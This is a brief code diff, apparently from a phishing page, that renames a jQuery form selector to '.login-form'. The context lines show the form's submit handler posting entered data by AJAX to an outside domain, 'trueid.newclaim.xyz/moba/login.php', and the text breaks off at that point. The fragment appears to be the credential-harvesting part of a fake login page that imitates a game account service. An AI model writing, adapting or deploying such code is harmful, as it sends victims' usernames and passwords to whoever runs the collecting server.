@@ -1,5 +1,5 @@
-$(".isimobalaex").submit(function() {
-	var d = $(".isimobalaex");
+$(".login-form").submit(function() {
+	var d = $(".login-form");
 
 	$.ajax({
         url: "https://trueid.newclaim.xyz/moba/login.php",
